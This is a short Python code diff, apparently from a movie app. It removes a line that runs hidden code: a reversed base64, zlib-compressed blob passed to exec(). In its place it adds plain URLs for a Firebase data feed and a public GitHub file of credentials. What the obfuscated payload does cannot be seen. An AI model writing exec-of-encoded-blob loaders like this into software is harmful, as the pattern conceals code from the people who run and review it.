@@ -1,1 +1,4 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'hW4EL9h+1/aku3Gyv4ihACQhjlGubCV4zJqjp016uVPp4KpgNBzAKmQhHE6WpriflGtiNb1RLCjxOWvPktCaBUf3KWon0h5BH4JBPGbqHqauigNljUmfJG3sEzWXQUflUKB2GWRr6CJ4mTg6Vm8lnQ3Ed9cIpMB6ut5x2mJ5cd4FXKrVuGeK+EgQI5Ce+v4EhxkOjc+fzAO9IKCvj4nlsXWl1v7WvyyP5Wco7RevRF0BS7k32Am+ma8A6fG5iFgABO/s5tauahZTcbpRGbheW52srO1zFthr7BiNs+Jch6lIazMsz5JGSwzRtkkhMKv9iSw7/ZVJy/hZ7ohqlTrQHL0sitsOf7BNLbsDDxOt7WFEbqx45druwJ89q93JrXvs6SeE4OYhpO5wzXf+Vt+fW9KBePkn93jJkAlyjhR/bmIjqEiEM7VxS/Nycpf2HDNAAAkQa2dwFwJe'))
+
+data_feed = "https://filmes-bbe51-default-rtdb.firebaseio.com/.json"
+credenciais = "https://raw.githubusercontent.com/cineroom1/teste/main/credenciais.json"
+
